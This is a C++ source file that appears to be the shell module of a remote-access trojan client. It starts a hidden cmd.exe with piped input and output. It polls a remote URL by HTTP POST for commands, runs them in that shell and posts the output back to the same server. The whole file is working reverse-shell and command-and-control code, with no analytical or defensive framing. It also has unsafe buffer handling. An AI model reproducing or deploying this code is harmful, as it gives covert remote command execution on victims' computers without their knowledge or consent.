

#include "ShellManager.h"

CShellManager::CShellManager(CClient *pClient):CBasicManager(pClient)
{
	printf("ShellManage!\n");
	SECURITY_ATTRIBUTES  sa = {0};  
	STARTUPINFO          si = {0};
	PROCESS_INFORMATION  pi = {0}; 
	char  strShellPath[MAX_PATH] = {0};

	m_hReadPipeHandle	= NULL;
	m_hWritePipeHandle	= NULL;
	m_hReadPipeShell	= NULL;
	m_hWritePipeShell	= NULL;
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = NULL; 
	sa.bInheritHandle = TRUE;


	if(!CreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0))
	{
		if(m_hReadPipeHandle != NULL)	CloseHandle(m_hReadPipeHandle);
		if(m_hWritePipeShell != NULL)	CloseHandle(m_hWritePipeShell);
		return;
	}

	if(!CreatePipe(&m_hReadPipeShell, &m_hWritePipeHandle, &sa, 0)) 
	{
		if(m_hWritePipeHandle != NULL)	CloseHandle(m_hWritePipeHandle);
		if(m_hReadPipeShell != NULL)	CloseHandle(m_hReadPipeShell);
		return;
	}

	memset((void *)&si, 0, sizeof(si));
	memset((void *)&pi, 0, sizeof(pi));

	GetStartupInfo(&si);
	si.cb = sizeof(STARTUPINFO);
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdInput  = m_hReadPipeShell;
	si.hStdOutput = si.hStdError = m_hWritePipeShell; 

	GetSystemDirectory(strShellPath, MAX_PATH);
	strcat(strShellPath,"\\cmd.exe");

	if (!CreateProcess(strShellPath, NULL, NULL, NULL, TRUE, 
		NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) 
	{
		CloseHandle(m_hReadPipeHandle);
		CloseHandle(m_hWritePipeHandle);
		CloseHandle(m_hReadPipeShell);
		CloseHandle(m_hWritePipeShell);
		return;
	}
	m_hProcessHandle = pi.hProcess;
	m_hThreadHandle	= pi.hThread;

	m_hThreadRead = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReadPipeThread, (LPVOID)this, 0, NULL);
	m_hThreadMonitor = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorThread, (LPVOID)this, 0, NULL);
	m_hThreadWork = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);
}

CShellManager::~CShellManager()
{
	TerminateThread(m_hThreadRead, 0);
	TerminateProcess(m_hProcessHandle, 0);
	TerminateThread(m_hThreadHandle, 0);
	WaitForSingleObject(m_hThreadMonitor, 2000);
	TerminateThread(m_hThreadMonitor, 0);

	if (m_hReadPipeHandle != NULL)
		DisconnectNamedPipe(m_hReadPipeHandle);
	if (m_hWritePipeHandle != NULL)
		DisconnectNamedPipe(m_hWritePipeHandle);
	if (m_hReadPipeShell != NULL)
		DisconnectNamedPipe(m_hReadPipeShell);
	if (m_hWritePipeShell != NULL)
		DisconnectNamedPipe(m_hWritePipeShell);

	CloseHandle(m_hReadPipeHandle);
	CloseHandle(m_hWritePipeHandle);
	CloseHandle(m_hReadPipeShell);
	CloseHandle(m_hWritePipeShell);

	CloseHandle(m_hProcessHandle);
	CloseHandle(m_hThreadHandle);
	CloseHandle(m_hThreadMonitor);
	CloseHandle(m_hThreadRead);
}

DWORD WINAPI CShellManager::WorkThread(LPVOID lparam)
{
	CShellManager *pThis = (CShellManager *)lparam;
    if(pThis==NULL)return 0;
	while(!pThis->b_quit)
	{
	Sleep(2000);
	
	char* strVer="1";
	char PostData[32];//注意buf大小
	sprintf(PostData,"ver=%s&id=%03d&type=shell",strVer,pThis->m_id);
	
	pThis->Post(ShellUrl,PostData);
	}
	return 1;
}

void CShellManager::OnReceive(LPBYTE lpBuff,DWORD dwSize)
{
	int i;
	for (i=0;i<dwSize;i++)
	{
		if(lpBuff[0]=='R'&&lpBuff[1]=='E'&&lpBuff[2]=='P')break;
		lpBuff++;

	}
	if (i==dwSize)
	{
		printf("NOT FOUND\n");
		return;
	}

	printf("\t%s\n",lpBuff);
	OutputDebugString((char*)lpBuff);
	char strShell[10240];
	memcpy(strShell,lpBuff+3,dwSize);
	if (memcmp(strShell,"quit",5)==0)
	{
		b_quit=TRUE;
		//SetEvent(m_pClient->m_hEvent);	
		return;
	}
    if(memcmp(strShell,"donothing",10)==0)return;
	sprintf(strShell,"%s%s",strShell,"\r\n");//要加上回车换行!
    DWORD nSize=strlen(strShell);
	DWORD	ByteWrite;
	WriteFile(m_hWritePipeHandle, strShell, nSize, &ByteWrite, NULL);
	//printf("\tDone!!\n");
}

DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lparam)
{
	unsigned long   BytesRead = 0;
	char	ReadBuff[1024];
	DWORD	TotalBytesAvail;
	CShellManager *pThis = (CShellManager *)lparam;
	while (!pThis->b_quit)
	{

		Sleep(1000);
		while (PeekNamedPipe(pThis->m_hReadPipeHandle, ReadBuff, sizeof(ReadBuff), &BytesRead, &TotalBytesAvail, NULL)) 
		{
			if (BytesRead <= 0)
				break;
			memset(ReadBuff, 0, sizeof(ReadBuff));

			LPBYTE* lpBuffer = (LPBYTE*)LocalAlloc(LPTR, TotalBytesAvail);
			ReadFile(pThis->m_hReadPipeHandle, lpBuffer, TotalBytesAvail, &BytesRead, NULL);
            //lpBuffer[BytesRead]='\0';
			// 发送数据
			//unsigned char* lpEncodedBuffer=(unsigned char*)LocalAlloc(LPTR,TotalBytesAvail*3);
			//DWORD EncodedLength=pThis->m_pClient->urlencode((unsigned char*)lpBuffer,TotalBytesAvail,lpEncodedBuffer,TotalBytesAvail*3);
            


			//printf("\nTotalAvail:%d\nBytesRead:%d\nlpBuffer:%d\nlpEncodedBuffer:%d\nEncodedLength:%d",TotalBytesAvail,BytesRead,sizeof(lpBuffer),sizeof(lpEncodedBuffer),EncodedLength);

            printf("\nTotalAvail:%d\nBytesRead:%d\nlpBuffer:%d\n",TotalBytesAvail,BytesRead,strlen((char*)lpBuffer));

			//char* PostData=(char*)LocalAlloc(LPTR, EncodedLength*3+32);
			//sprintf(PostData,"output=%s",lpEncodedBuffer);

            char* PostData=(char*)LocalAlloc(LPTR, TotalBytesAvail+32);
			sprintf(PostData,"output=%s",lpBuffer);

			pThis->Post(ShellUrl,(char*)PostData);
			printf("%s\n",PostData);

			LocalFree(PostData);
			//LocalFree(lpEncodedBuffer);
			LocalFree(lpBuffer);
		}



	}
	return 0;
}

DWORD WINAPI CShellManager::MonitorThread(LPVOID lparam)
{
	CShellManager *pThis = (CShellManager *)lparam;
	HANDLE hThread[3];
	hThread[0] = pThis->m_hProcessHandle;
	hThread[1] = pThis->m_hThreadRead;
	hThread[2]=pThis->m_hThreadWork;
	WaitForMultipleObjects(3, hThread, FALSE, INFINITE);
	TerminateThread(pThis->m_hThreadRead, 0);
	TerminateProcess(pThis->m_hProcessHandle, 1);
	SetEvent(pThis->m_hEvent);
	return 0;
}
